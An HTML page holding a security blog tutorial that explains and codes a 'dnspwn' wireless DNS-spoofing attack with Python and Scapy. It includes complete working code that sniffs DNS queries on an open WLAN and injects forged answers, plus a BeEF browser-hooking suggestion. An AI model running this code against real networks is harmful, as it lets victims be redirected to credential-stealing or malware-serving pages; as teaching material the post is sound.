
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>Wireless Attacks with Python: Part One - The "Dnspwn Attack" - jordan-wright</title>
  <meta name="author" content="Jordan">

  
  <meta name="description" content="Introduction A while back, I published a post on the Raidersec blog demonstrating how to perform a deauthentication attack using Python and Scapy. I &hellip;">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="http://jordan-wright.github.io/blog/2013/11/15/wireless-attacks-with-python-part-one-the-airpwn-attack">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <link href="/stylesheets/data-tables.css" media="screen, projection" rel="stylesheet" type="text/css">
  <link href="/atom.xml" rel="alternate" title="jordan-wright" type="application/atom+xml">
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/lib/jquery.min.js"%3E%3C/script%3E'))</script>
  <script src="/javascripts/octopress.js" type="text/javascript"></script>
  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<link href="/stylesheets/blog.css" rel="stylesheet" media="screen, projection" type="text/css">
<link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.min.css" rel="stylesheet">
<script src="https://cdn.jsdelivr.net/vivus/0.1.2/vivus.min.js"></script>

  
  <script type="text/javascript">
    var _gaq = _gaq || [];
    _gaq.push(['_setAccount', 'UA-44718701-1']);
    _gaq.push(['_trackPageview']);

    (function() {
      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
    })();
  </script>


</head>

<body   >
  <header role="banner"><hgroup>
  <h1><a href="/">jordan-wright</a></h1>
  
    <h2>Security and Programming Blog</h2>
  
</hgroup>

</header>
  <nav role="navigation"><ul class="subscription" data-subscription="rss">
  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
  
</ul>
  
<form action="http://google.com/search" method="get">
  <fieldset role="search">
    <input type="hidden" name="q" value="site:jordan-wright.github.io" />
    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
  </fieldset>
</form>
  
<ul class="main-navigation">
  <li><a href="/">Home</a></li>
  <li><a href="/contact">Contact</a></li>
  <li><a href="/projects">Projects</a></li>
  <li><a href="/blog">Blog</a></li>
  <li><a href="http://raidersec.blogspot.com">Raidersec</a></li>
  <li><a href="/blog/archives">Archives</a></li>
</ul>

</nav>
  <div id="main">
    <div id="content">
      <div>
<article class="hentry" role="article">
  
  <header>
    
      <h1 class="entry-title">Wireless Attacks With Python: Part One - the "Dnspwn Attack"</h1>
    
    
      <p class="meta">
        








  


<time datetime="2013-11-15T20:45:00-06:00" pubdate data-updated="true">Nov 15<span>th</span>, 2013</time>
        
           | <a href="#disqus_thread"
             data-disqus-identifier="http://jordan-wright.github.io">Comments</a>
        
      </p>
    
  </header>


<div class="entry-content"><p><img src="/images/headers/wireless_python.png"/></p>

<h3>Introduction</h3>

<p>A while back, I <a href="http://raidersec.blogspot.com/2013/01/wireless-deauth-attack-using-aireplay.html">published a post</a> on the Raidersec blog demonstrating how to perform a deauthentication attack using Python and Scapy. I enjoyed writing the post, since I got the opportunity to learn in-depth about how different wireless attacks work, beyond just learning how to exclusively use the <a href="http://www.aircrack-ng.org/">aircrack suite</a>.</p>

<p>So, with that being said, this post will kick off a short series of posts discussing how to perform common wireless attacks using Python. I hope you enjoy the posts and, as always, never hesitate to let me know if you have any comments or questions below.</p>

<!--more-->


<h3>The &ldquo;Dnspwn Attack&rdquo;</h3>

<p>The first attack we&rsquo;ll explore is what I call the &ldquo;dnspwn attack&rdquo; (since, from what I can tell, this attack was first created targeting HTTP with the &ldquo;<a href="http://airpwn.sourceforge.net/Airpwn.html">airpwn</a>&rdquo; tool, and later extended to DNS) The idea behind the attack is pretty simple:</p>

<p>Consider two people on the same open WLAN: Bob and Eve. Eve wants to get Bob to visit a malicious webpage she created so that she can install malware onto Bob&rsquo;s computer via a drive-by download, or perhaps show a spoofed website to try and steal Bob&rsquo;s credentials.</p>

<p>To do this, she remembers that she can sniff all requests coming to and from Bob&rsquo;s computer. She also knows that she is <em>closer</em> to Bob than the web server he is sending a request to. So, she decides to wait until Bob sends a web request, and see if she can send back a spoofed response pretending to come from the web server <em>before</em> the actual web server can respond. Turns out, she can. In fact, once the spoofed response is received, Bob&rsquo;s computer will likely ignore any further traffic received, including the real response!</p>

<p>Let&rsquo;s see what this would look like:</p>

<p><a href="/images/blog/wireless-attacks/dnspwn/diagram.png" target="_blank"><img src="/images/blog/wireless-attacks/dnspwn/diagram_small.png"/></a></p>

<p>So, now that we know how the attack works, let&rsquo;s automate it!</p>

<h3>Setting up the Alfa AWUS06H</h3>

<p>As was the case in my Raidersec post, we will be using the handy <a href="http://www.amazon.com/Alfa-AWUS036H-802-11b-Wireless-network/dp/B002WCEWU8">Alfa AWUS036H</a> for this attack. The first thing we want to do is to put our wireless card in monitor mode so that we can capture all traffic coming from the <code>demo_insecure</code> network.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@bt:~# airmon-ng start wlan0</span></code></pre></td></tr></table></div></figure>


<p>Now that we have monitor mode up and running on <code>mon0</code>, let&rsquo;s start coding!</p>

<h3>Coding the Attack</h3>

<p>We will utilize the <code>scapy</code> module to perform the attack. Let&rsquo;s start by sniffing any UDP packet with a destination of port 53, and send the packet to a function called <code>send_response</code> that we will make later:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>from scapy.all import *
</span><span class='line'>
</span><span class='line'>sniff(prn=lambda x: send_response(x),
</span><span class='line'>  lfilter=lambda x:x.haslayer(UDP) and x.dport == 53)</span></code></pre></td></tr></table></div></figure>


<p>Now let&rsquo;s create a function which can parse the request for relevant information, and inject the response. We can parse the packet and create our response simply by working our way up the layers as follows:</p>

<ul>
<li>802.11 Frame &ndash; Change the &ldquo;to-ds&rdquo; flag to &ldquo;from-ds&rdquo; (our request will now be coming <em>from</em> the access point)</li>
<li>802.11 Frame &ndash; Switch the source and destination MAC addresses</li>
<li>IP Layer &ndash; Switch the source and destination IP addresses</li>
<li>UDP layer &ndash; Switch the source and destination ports</li>
<li>DNS layer &ndash; Set the &ldquo;answer&rdquo; flag(s), and append our spoofed answer</li>
</ul>


<p>Fortunately, <code>scapy</code> makes this very simple for us by abstracting away a lot of minor details (e.g. in fact, there are <em>4</em> MAC address fields in an 802.11 frame, each in a different order depending on the direction of the packet). With that being said, here&rsquo;s the code:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>def send_response(x):
</span><span class='line'>  # Get the requested domain
</span><span class='line'>  req_domain = x[DNS].qd.qname
</span><span class='line'>  spoofed_ip = '192.168.2.1'
</span><span class='line'>  # Let's build our response from a copy of the original packet
</span><span class='line'>  response = x.copy()
</span><span class='line'>  # We need to start by changing our response to be "from-ds", or from the access point.
</span><span class='line'>  response.FCfield = 2L
</span><span class='line'>  # Switch the MAC addresses
</span><span class='line'>  response.addr1, response.addr2 = x.addr2, x.addr1
</span><span class='line'>  # Switch the IP addresses
</span><span class='line'>  response.src, response.dst = x.dst, x.src
</span><span class='line'>  # Switch the ports
</span><span class='line'>  response.sport, response.dport = x.dport, x.sport
</span><span class='line'>  # Set the DNS flags
</span><span class='line'>  response[DNS].qr = 1L
</span><span class='line'>  response[DNS].ra = 1L
</span><span class='line'>  response[DNS].ancount = 1</span></code></pre></td></tr></table></div></figure>


<p>Now that we&rsquo;ve set all the flags, let&rsquo;s create and append the DNS answer:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>response[DNS].an = DNSRR(
</span><span class='line'>  rrname = req_domain,
</span><span class='line'>  type = 'A',
</span><span class='line'>  rclass = 'IN',
</span><span class='line'>  ttl = 900,
</span><span class='line'>  rdata = spoofed_ip
</span><span class='line'>  )</span></code></pre></td></tr></table></div></figure>


<p>And, finally, we inject the spoofed response:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sendp(response)</span></code></pre></td></tr></table></div></figure>


<p>That&rsquo;s all there is to it! You can find the full source on <a href="https://github.com/jordan-wright/python-wireless-attacks/blob/master/dnspwn.py">Github</a>.</p>

<h3>Demo</h3>

<p>For the demo, I have the following HTML response available on the host 192.168.2.138:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;html&gt;
</span><span class='line'>&lt;head&gt;&lt;/head&gt;
</span><span class='line'>&lt;body&gt;
</span><span class='line'>  Owned.
</span><span class='line'>&lt;/body&gt;
</span><span class='line'>&lt;/html&gt;</span></code></pre></td></tr></table></div></figure>


<p>It&rsquo;s worth noticing that we can have <em>any</em> HTML, Javascript, etc. we want. It would be trivial to hook the browser using the <a href="http://beefproject.com/">BeEF framework</a>, for example.</p>

<p>Here&rsquo;s a screenshot of it in action (I am using my iPhone as the victim):</p>

<p><a href="/images/blog/wireless-attacks/dnspwn/screen_shot_pc.png" target="_blank"><img src="/images/blog/wireless-attacks/dnspwn/screen_shot_pc.png"/></a>
<a href="/images/blog/wireless-attacks/dnspwn/iphone.png" target="_blank"><img src="/images/blog/wireless-attacks/dnspwn/iphone_small.png"/></a></p>

<h3>Conclusion &amp; Future Improvements</h3>

<p>It&rsquo;s important to note that this attack will work just as well on other simple request/response protocols. For example, the original &ldquo;airpwn&rdquo; attack spoofed HTTP responses. There are also quite a few improvements we can make to this script. Here are a few:</p>

<ul>
<li>Match requests against regular expressions (for example, only replacing Javascript content)</li>
<li>Set options from arguments / Read configuration information from a file</li>
<li>Implement the attack for other protocols (ie HTTP).</li>
</ul>


<p>Enjoy!</p>

<p>Jordan (<a href="http://twitter.com/jw_sec">@jw_sec</a>)</p>
</div>


  <footer>
    <p class="meta">
      
  

<span class="byline author vcard">Posted by <span class="fn">Jordan</span></span>

      








  


<time datetime="2013-11-15T20:45:00-06:00" pubdate data-updated="true">Nov 15<span>th</span>, 2013</time>
      

<span class="categories">
  
    <a class='category' href='/blog/categories/python/'>python</a>, <a class='category' href='/blog/categories/security/'>security</a>, <a class='category' href='/blog/categories/wireless/'>wireless</a>
  
</span>


    </p>
    
      <div class="sharing">
  
  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://jordan-wright.github.io/blog/2013/11/15/wireless-attacks-with-python-part-one-the-airpwn-attack/" data-via="" data-counturl="http://jordan-wright.github.io/blog/2013/11/15/wireless-attacks-with-python-part-one-the-airpwn-attack/" >Tweet</a>
  
  
  <div class="g-plusone" data-size="medium"></div>
  
  
</div>

    
    <p class="meta">
      
        <a class="basic-alignment left" href="/blog/2013/11/07/how-to-pentest-iphone-apps-with-burp/" title="Previous Post: How to Pentest iPhone Apps with Burp">&laquo; How to Pentest iPhone Apps with Burp</a>
      
      
        <a class="basic-alignment right" href="/blog/2013/11/29/building-gophish-day-1/" title="Next Post: Building Gophish - Day 1">Building Gophish - Day 1 &raquo;</a>
      
    </p>
  </footer>
</article>

  <section>
    <h1>Comments</h1>
    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
</div>
  </section>

</div>

<aside class="sidebar">
  
    <section>
  <h1>Recent Posts</h1>
  <ul id="recent_posts">
    
      <li class="post">
        <a href="/blog/2015/03/23/introducing-elastichoney-an-elasticsearch-honeypot/">Introducing Elastichoney - an Elasticsearch Honeypot</a>
      </li>
    
      <li class="post">
        <a href="/blog/2015/03/08/elasticsearch-rce-vulnerability-cve-2015-1427/">Remote Code Execution in Elasticsearch - CVE-2015-1427</a>
      </li>
    
      <li class="post">
        <a href="/blog/2015/02/28/how-tor-works-part-one/">How Tor Works: Part One</a>
      </li>
    
      <li class="post">
        <a href="/blog/2015/02/26/gophish-update-getting-closer-to-alpha/">Gophish Update: Getting Closer to Alpha!</a>
      </li>
    
      <li class="post">
        <a href="/blog/2015/02/21/web-scraping-hotel-prices-for-fun-and-savings/">Web Scraping Hotel Prices for Fun and Savings</a>
      </li>
    
  </ul>
</section>





  
</aside>


    </div>
  </div>
  <footer role="contentinfo"><p>
  Copyright &copy; 2015 - Jordan -
  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span><span> Icons made by Freepik from <a href="http://www.flaticon.com" title="Flaticon">www.flaticon.com</a> is licensed by <a href="http://creativecommons.org/licenses/by/3.0/" title="Creative Commons BY 3.0">CC BY 3.0</a></span>
</p>

</footer>
  

<script type="text/javascript">
      var disqus_shortname = 'jordan-wright';
      
        
        // var disqus_developer = 1;
        var disqus_identifier = 'http://jordan-wright.github.io/blog/2013/11/15/wireless-attacks-with-python-part-one-the-airpwn-attack/';
        var disqus_url = 'http://jordan-wright.github.io/blog/2013/11/15/wireless-attacks-with-python-part-one-the-airpwn-attack/';
        var disqus_script = 'embed.js';
      
    (function () {
      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
      dsq.src = ('https:' == document.location.protocol ? 'https://' : 'http://') + disqus_shortname + '.disqus.com/' + disqus_script;
      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    }());
</script>





  <script type="text/javascript">
    (function() {
      var script = document.createElement('script'); script.type = 'text/javascript'; script.async = true;
      script.src = 'https://apis.google.com/js/plusone.js';
      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(script, s);
    })();
  </script>



  <script type="text/javascript">
    (function(){
      var twitterWidgets = document.createElement('script');
      twitterWidgets.type = 'text/javascript';
      twitterWidgets.async = true;
      twitterWidgets.src = '//platform.twitter.com/widgets.js';
      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
    })();
  </script>





</body>
</html>
